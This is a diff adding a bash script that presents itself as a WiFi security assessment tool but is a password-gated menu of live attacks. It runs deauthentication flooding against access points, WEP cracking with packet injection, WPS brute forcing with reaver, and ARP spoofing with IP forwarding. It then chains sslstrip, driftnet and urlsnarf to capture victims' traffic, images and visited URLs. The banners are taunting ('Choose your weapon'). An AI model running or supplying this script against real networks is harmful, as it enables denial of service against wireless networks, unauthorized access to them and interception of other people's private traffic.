@@ -1,0 +1,358 @@
+#!/bin/bash
+
+
+RCol='\e[0m'    # Text Reset
+
+# Regular           Bold                Underline           High Intensity      BoldHigh Intens     Background          High Intensity Backgrounds
+Bla='\e[0;30m';     BBla='\e[1;30m';    UBla='\e[4;30m';    IBla='\e[0;90m';    BIBla='\e[1;90m';   On_Bla='\e[40m';    On_IBla='\e[0;100m';
+Red='\e[0;31m';     BRed='\e[1;31m';    URed='\e[4;31m';    IRed='\e[0;91m';    BIRed='\e[1;91m';   On_Red='\e[41m';    On_IRed='\e[0;101m';
+PASS="lux"
+Gre='\e[0;32m';     BGre='\e[1;32m';    UGre='\e[4;32m';    IGre='\e[0;92m';    BIGre='\e[1;92m';   On_Gre='\e[42m';    On_IGre='\e[0;102m';
+Yel='\e[0;33m';     BYel='\e[1;33m';    UYel='\e[4;33m';    IYel='\e[0;93m';    BIYel='\e[1;93m';   On_Yel='\e[43m';    On_IYel='\e
+[0;103m';
+Blu='\e[0;34m';     BBlu='\e[1;34m';    UBlu='\e[4;34m';    IBlu='\e[0;94m';    BIBlu='\e[1;94m';   On_Blu='\e[44m';    On_IBlu='\e[0;104m';
+Pur='\e[0;35m';     BPur='\e[1;35m';    UPur='\e[4;35m';    IPur='\e[0;95m';    BIPur='\e[1;95m';   On_Pur='\e[45m';    On_IPur='\e[0;105m';
+Cya='\e[0;36m';     BCya='\e[1;36m';    UCya='\e[4;36m';    ICya='\e[0;96m';    BICya='\e[1;96m';   On_Cya='\e[46m';    On_ICya='\e[0;106m';
+Whi='\e[0;37m';     BWhi='\e[1;37m';    UWhi='\e[4;37m';    IWhi='\e[0;97m';    BIWhi='\e[1;97m';   On_Whi='\e[47m';    On_IWhi='\e[0;107m';
+
+
+bold=`tput bold`
+normal=`tput sgr0`
+clear
+echo ""
+echo -e "${Red}  █    ██  ██▓  ▄▄▄█████▓ ██▓ ███▄ ▄███▓ ▄▄▄     ▄▄▄█████▓▓█████ ";
+echo "  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒▓██▒▀█▀ ██▒▒████▄   ▓  ██▒ ▓▒▓█   ▀ ";
+echo " ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒▓██    ▓██░▒██  ▀█▄ ▒ ▓██░ ▒░▒███   ";
+echo " ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░▒██    ▒██ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄ ";
+echo " ▒▒█████▓ ░██████▒▒██▒ ░ ░██░▒██▒   ░██▒ ▓█   ▓██▒ ▒██▒ ░ ░▒████▒";
+echo " ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░";
+echo " ░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░░  ░      ░  ▒   ▒▒ ░   ░     ░ ░  ░";
+echo "  ░░░ ░ ░   ░ ░   ░       ▒ ░░      ░     ░   ▒    ░         ░   ";
+echo "    ░         ░  ░        ░         ░         ░  ░           ░  ░";
+echo "                                                                ";
+echo "  [+] Robert Shala - TjoniG"
+echo "  [+] November 1, 2014 - Online. "
+echo "  [+] WIFI Security Assesment Script."     
+echo ""                                                  
+echo -n "  [?] Please enter the Password: "
+read mypassword
+
+if [ "$mypassword" = "$PASS" ] 
+
+then
+
+echo "  [!] Password Accepted." 
+
+sleep 1 
+clear
+echo ""
+echo ""
+echo "  █    ██  ██▓  ▄▄▄█████▓ ██▓ ███▄ ▄███▓ ▄▄▄     ▄▄▄█████▓▓█████ ";
+echo "  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒▓██▒▀█▀ ██▒▒████▄   ▓  ██▒ ▓▒▓█   ▀ ";
+echo " ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒▓██    ▓██░▒██  ▀█▄ ▒ ▓██░ ▒░▒███   ";
+echo " ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░▒██    ▒██ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄ ";
+echo " ▒▒█████▓ ░██████▒▒██▒ ░ ░██░▒██▒   ░██▒ ▓█   ▓██▒ ▒██▒ ░ ░▒████▒";
+echo " ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░";
+echo " ░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░░  ░      ░  ▒   ▒▒ ░   ░     ░ ░  ░";
+echo "  ░░░ ░ ░   ░ ░   ░       ▒ ░░      ░     ░   ▒    ░         ░   ";
+echo "    ░         ░  ░        ░         ░         ░  ░           ░  ░";
+echo ""
+echo " @#@#@#@#@#@#                                                               ";
+echo " WIFI HACKING"
+echo " @#@#@#@#@#@#"
+echo ""
+echo " 1) [+] WiFi Denial of Service - DDoS"
+echo " 2) [+] WEP Cracking"
+echo " 3) [+] WPA Cracking"
+echo ""
+echo " @#@#@#@#@#@#@#@#@#@#@#@#@"
+echo " MAN-IN-THE-MIDDLE Hacking"
+echo " @#@#@#@#@#@#@#@#@#@#@#@#@"
+echo ""
+echo " 4) [+] ARPspoof / Ettercap"
+echo " 5) [+] SSL Strip"
+echo " 6) [+] Driftnet "
+echo " 7) [+] URLSnarf "
+echo  ""
+echo "Choose your weapon:"
+read option
+case $option in
+1) 
+clear
+echo "======================================"
+echo "              WiFi - DDoS!"
+echo "======================================"
+echo ""
+echo "      ░░░░░░███████ ]▄▄▄▄▄▄▄▄▃"
+echo "        ▂▄▅█████████▅▄▃▂"
+echo "       ███████████████████]."
+echo "        ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤ "
+echo "                       ______________ "
+echo "                       |De-Auth Tank| "
+echo "                       ^^^^^^^^^^^^^^ "
+echo "======================================"
+echo "      Deauthentication Application    "
+echo "               For WLAN               "
+echo "                                      "
+echo "          Author: Hardcore            "  
+echo "          Pimp:   Cratos              "
+echo "======================================"
+echo "      Press enter to continue.        "
+read a
+echo "    Initializing mon0, please wait.   "
+echo "======================================"
+airmon-ng stop mon0
+airmon-ng start wlan0
+NetworkManager
+sleep 2
+service network-manager stop
+echo -n "Write the monitoring interface: "
+read mon
+
+gnome-terminal --working-directory=/root/Desktop/ -x bash -c " airodump-ng $mon ;bash "
+
+echo -n "Enter the BSSID: "
+read bssid
+
+echo -n "Enter Channel: "
+read ch
+
+echo "======================================"
+echo "        Deauth Bomb Launching!        "
+echo "             Please wait.             "
+echo "======================================"
+
+service network-manager stop
+iwconfig wlan0 channel $ch
+iwconfig mon0 channel $ch
+sleep 2
+
+echo "             BOOOM BITCH!             "
+echo "======================================"
+gnome-terminal --working-directory=/root/Desktop/ -x bash -c "aireplay-ng --deauth 0 -a $bssid $mon --ignore-negative-one ;bash"
+echo "Press enter to start network manager when you are done!"
+read a
+sleep 10
+gnome-terminal --working-directory=/root/Desktop/ -x bash -c "Network Manager"
+;;
+
+2)
+clear
+echo "======================================="
+echo "         \ \ /\ / / _ \ '_ \ " 
+echo "          \ V  V /  __/ |_) | "
+echo "           \_/\_/ \___| .__/  "
+echo "                      | |      "
+echo "                      |_|     "
+echo "======================================="
+echo "            WEP CRACKING!"
+echo "======================================="
+echo "Press enter to continue. "
+read a
+echo "======================================="
+echo "Restarting mon0 interfaces."
+airmon-ng stop mon0
+airmon-ng start wlan0
+echo "======================================="
+echo "Press enter to scan AP's       "
+read a
+echo "======================================="
+gnome-terminal --working-directory=/root/Desktop -x bash -c "airodump-ng mon0 ;bash"
+echo ""
+
+echo -n "Enter Channel: "
+read channel
+echo -n "Enter BSSID: "
+read bssid
+echo -n "Enter Filename: "
+read filename
+
+iwconfig wlan0 channel $channel
+iwconfig mon0 channel $channel
+gnome-terminal --working-directory=/root/Desktop -x bash -c "airodump-ng mon0 -c $channel --bssid $bssid -w $filename ;bash "
+
+sleep 2
+echo "Press enter to acquire the handshake"
+read a
+gnome-terminal --working-directory=/root/Desktop -x bash -c "aireplay-ng -1 0 -a $bssid mon0 --ignore-negative-one ;bash"
+echo "Press enter to initiate packet injection"
+echo "======================================="
+read a
+
+gnome-terminal --working-directory=/root/Desktop -x bash -c "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $bssid mon0 ;bash"
+echo "Enter to start cracking!"
+read a
+
+clear
+
+gnome-terminal --working-directory=/root/Desktop -x bash -c "aircrack-ng $filename'-01.cap';bash"
+;;
+
+3)
+clear
+
+airmon-ng stop mon5
+clear
+airmon-ng stop mon4
+clear
+airmon-ng stop mon3
+clear
+airmon-ng stop mon2
+clear
+airmon-ng stop mon1
+clear
+airmon-ng stop mon0
+airmon-ng start wlan0
+
+echo "======================================="
+echo "             WPA HACKING "
+echo "======================================="
+echo -n "Please enter the device mode: "
+read mon1
+echo "======================================="
+echo "Press enter to proceed"
+read a
+gnome-terminal --working-directory=/root/Desktop -x bash -c "airodump-ng $mon1; bash"
+echo "======================================="
+echo -n "Please enter the channel: "
+read channel1
+echo -n "Please enter the BSSID: "
+read bssid1
+echo "======================================="
+echo " Hacking. Estimated time: 8 Hours.     "
+echo "======================================="
+sleep 3
+gnome-terminal --working-directory=/root/Desktop -x bash -c "reaver -i $mon1 -b $bssid1 --dh-small -d 3 --lock-delay=250 --no-nacks --fail-wait=350 --eap-terminate -vv -c $channel1; bash"
+;;
+
+4)
+clear
+route
+echo "Shtyp IP adresen e networkut: "
+read ip
+gnome-terminal --working-directory=/root/Desktop -x bash -c "nmap -Pn $ip'/24'"
+echo "====================================================="
+echo "             ███████████████████████████             "
+echo "             ███████▀▀▀░░░░░░░▀▀▀███████             "
+echo "             ████▀░░░░░░░░░░░░░░░░░▀████             "
+echo "             ███│░░░░░░░░░░░░░░░░░░░│███             "
+echo "             ██▌│░░░░░░░░░░░░░░░░░░░│▐██             "
+echo "             ██░└┐░░░░░░░░░░░░░░░░░┌┘░██             "
+echo "             ██░░└┐░░░░░░░░░░░░░░░┌┘░░██             "
+echo "             ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██             "
+echo "             ██▌░│██████▌░░░▐██████│░▐██             "
+echo "             ███░│▐███▀▀░░▄░░▀▀███▌│░███             "
+echo "             ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██             "
+echo "             ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██             "
+echo "             ████▄─┘██▌░░░░░░░▐██└─▄████             "
+echo "             █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████             "
+echo "             ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████             "
+echo "             █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████             "
+echo "             ███████▄░░░░░░░░░░░▄███████             "
+echo "             ██████████▄▄▄▄▄▄▄██████████             "
+echo "====================================================="
+echo "       Welcome to the ARP Spoofing Motherfucker      "
+echo "                By Grazer 2014 GPL C.                "
+echo "====================================================="
+arp -a
+echo "====================================================="
+echo "ARP Spoofing is a method of starting a MITM attack."
+echo "      This is how a MITM attack looks like:"
+echo "   (Target Router)<---->(ATTACKER)<----->(Victim) "
+echo "====================================================="
+echo -n "Please enter router/AP IP adress: "
+read router
+sleep 2
+echo -n "Please enter victim IP adress: "
+read victim
+sleep 2
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+echo '1' > /proc/sys/net/ipv4/ip_forward
+sleep 2
+gnome-terminal --working-directory=/root/Desktop -x bash -c "arpspoof -i wlan0 -t $router $victim ;bash"
+gnome-terminal --working-directory=/root/Desktop -x bash -c "arpspoof -i wlan0 -t $victim $router ;bash"
+echo "====================================================="
+echo "           PRESS ENTER TO START ETTERCAP! "
+echo "====================================================="
+read a
+ettercap -Tqi wlan0
+;;
+
+5)
+clear
+echo "====================================================="
+echo "                                                    ";
+echo " _____ _____ __       _____ _____ _____ _____ _____ ";
+echo "|   __|   __|  |     |   __|_   _| __  |     |  _  |";
+echo "|__   |__   |  |__   |__   | | | |    -|-   -|   __|";
+echo "|_____|_____|_____|  |_____| |_| |__|__|_____|__|   ";
+echo "                                                    ";
+echo "====================================================="
+echo "      Welcome to the SSL Stripping Motherfucker      "
+echo "                By Grazer 2014 GPL C.                "
+echo "====================================================="
+echo "SSL Strip is an attack that removes secure connections"
+echo "that the victim has established. It turns HTTPS to "
+echo "HTTP. This way, you can sniff out all the information"
+echo "====================================================="
+echo "    Hint: Start ARPspoofing first to do hacking. "
+read a
+sslstrip -l 8080
+;;
+
+6)
+clear
+echo "========================================================="
+echo " ___    ____   ____  _____  ______  ____     ___ ______ ";
+echo "|   \  |    \ |    ||     ||      ||    \   /  _]      |";
+echo "|    \ |  D  ) |  | |   __||      ||  _  | /  [_|      |";
+echo "|  D  ||    /  |  | |  |_  |_|  |_||  |  ||    _]_|  |_|";
+echo "|     ||    \  |  | |   _]   |  |  |  |  ||   [_  |  |  ";
+echo "|     ||  .  \ |  | |  |     |  |  |  |  ||     | |  |  ";
+echo "|_____||__|\_||____||__|     |__|  |__|__||_____| |__|  ";
+echo "                                                        ";
+echo "========================================================="
+echo "                       DRIFTNET!                 "
+echo "========================================================="
+echo "      Driftnet is a tool that is used to capture"
+echo "      all picture formats that a viewer is seeing."
+echo "        Using SSL with Driftnet is reccomended."
+echo "========================================================="
+echo -n "Please type the interface for driftnet: "
+read mon12
+driftnet -i $mon12
+;;
+
+7)
+clear
+echo "=============================================="
+echo " _______  __    _  _______  ______    _______ ";
+echo "|       ||  |  | ||   _   ||    _ |  |       |";
+echo "|  _____||   |_| ||  |_|  ||   | ||  |    ___|";
+echo "| |_____ |       ||       ||   |_||_ |   |___ ";
+echo "|_____  ||  _    ||       ||    __  ||    ___|";
+echo "  ____| || | |   ||   _   ||   |  | ||   |    ";
+echo "|_______||_|  |__||__| |__||___|  |_||___|    ";
+echo "                                                                          ";
+echo "==============================================="
+echo "              URLSNARF BITCHES!                "
+echo "==============================================="
+echo "This application will capture all the URL's"
+echo "that the victim visits through the web browser."
+echo "Please use this attack nwith SSLSTRIP."
+echo "==============================================="
+echo -n "What is your interface?: "
+read mono123
+urlsnarf -i $mono123
+;;
+
+*)
+echo "Wrong choice!"
+sleep 3
+;;
+esac
+
+else
+exit 0
+fi
+
